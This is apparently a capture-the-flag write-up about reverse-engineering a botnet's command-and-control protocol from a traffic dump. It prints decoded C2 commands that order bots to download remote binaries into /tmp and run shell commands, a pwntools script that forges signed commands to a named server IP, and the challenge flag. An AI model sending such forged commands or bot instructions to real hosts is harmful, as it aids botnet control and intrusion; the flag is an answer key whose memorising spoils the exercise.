#### Challenge:

Hi, executive senior investigator! 

We have managed to get a rare catch - a traffic dump of issuing commands for the C2 server by its master! Glory to the network specialists of unnamed company. Try to find out how this communication works. [botnet_master.tar.xz](./botnet_master.tar.xz ":ignore")

Our network analytics report that one of currently online C2 servers can be found on IP `78.128.216.92` on `TCP/20220`.

Good luck!

---

#### Solution:

```bash
tshark -r ./master.pcap  -T fields -e data  -Y 'tcp'  > communication.txt
```

```python
#!/usr/bin/env python3
import base64

with open('communication.txt', mode='r') as f:
    for l in f.readlines():
        l = l.strip()
        if len(l) > 0:
            l = bytes.fromhex(l)
            header_len = l[:8].hex()
            l = l[8:]
            l = base64.b64decode(l)[::-1].decode("utf-8")
            try:
                l = bytes.fromhex(l).decode("utf-8")
                print(header_len, l[8:])
            except:
                l = bytes.fromhex(l[16:]).decode("utf-8")
                print(header_len, l)
                pass
```

- after decoding the communication we can see that `kl5puyj43brf7iso` can perform commands: `wait` `download` `info` `execute`

```console
message length       client         command                                 sha384 of $client + ;; + $command
---------------------------------------------------------------------------------------------------------------------------------------------------------
0000000000000168 kl5puyj43brf7iso;;wait;;*;;5;;944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb
0000000000000048 command accepted;;
00000000000001a0 kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
0000000000000234 ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
00000000000001f0 kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
0000000000000048 command accepted;;
00000000000001d0 kl5puyj43brf7iso;;download;;*;;/tmp/key;;http://198.19.220.13:80/key;;17dfdf78c676a747ed0640f6b01b1693ccb1bf0ad915ac9b04e2fdace5e109402f67cd7499b028216a07c2c839d4f5fd
0000000000000048 command accepted;;
00000000000001a0 kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
0000000000000234 ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
00000000000001f8 kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/e53;;http://198.19.220.13:80/e53;;6d855614bc506728ec6015b27d1f195307bf20874896f23c5b3b7fe22005d74eb82d4740209b1be17e2de0ff3d5055f1
0000000000000048 command accepted;;
0000000000000200 kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/flag;;http://198.19.220.13:80/flag;;cfb8ad2096b87f07ef3154e198862bab81bce63cba14fd1ecd01ac83c849a42df494dd3b64793f4fad8cc02aa21ec61e
0000000000000048 command accepted;;
00000000000001a0 kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
0000000000000234 ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
0000000000000190 kl5puyj43brf7iso;;wait;;0hpxc5sdo9kgne64;;30;;b7894e9dfb8e92c804fd463d0f3fc1d674a448291a8f049a40a2bed111a0a32d5f257c255fcb645cbd553a6e7debf4c3
0000000000000048 command accepted;;
00000000000001a4 kl5puyj43brf7iso;;info;;203.0.113.16.20202;;clients;;c3c832bc83fa5d291559487932c5f57d35e838dfe9ec385b49dd45e0a28095738012082401d8b35e55411a25a1acfb96
0000000000000234 ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
00000000000001f0 kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
0000000000000048 command accepted;;
0000000000000180 kl5puyj43brf7iso;;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6
0000000000000048 command accepted;;
```

- after replaying some of the `commands` we noticed that the server sometimes spits out `flag` for `kl5puyj43brf7iso;;info;;78.128.216.92.20220;;clients`

```python
#!/usr/bin/env python2
import base64
import hashlib
import struct
from pwn import *

def parse(msg):
    msg = msg[8:]
    msg = base64.b64decode(msg)[::-1]
    print(msg.decode('hex')[8:])


def bake(msg):
    digest = hashlib.sha384(msg).hexdigest()
    msg = ('\x00\x00\x00\x00\x00\x00\x00\x00' +msg + ";;" +digest ).encode('hex')
    msg = msg[::-1]
    msg = base64.b64encode(msg)
    return struct.pack(">Q", len(msg)) + msg


with remote('78.128.216.92', 20220) as r:
    r.sendline(bake('kl5puyj43brf7iso;;info;;78.128.216.92.20220;;clients'))
    msg = r.recv()
    parse(msg)
```

```bash
./solve.py | grep -e 'FLAG{.*}'
```

---

<details><summary>FLAG:</summary>

```
FLAG{uLHI-3Zq1-kOHx-FGR1}
```

</details>
<br/>
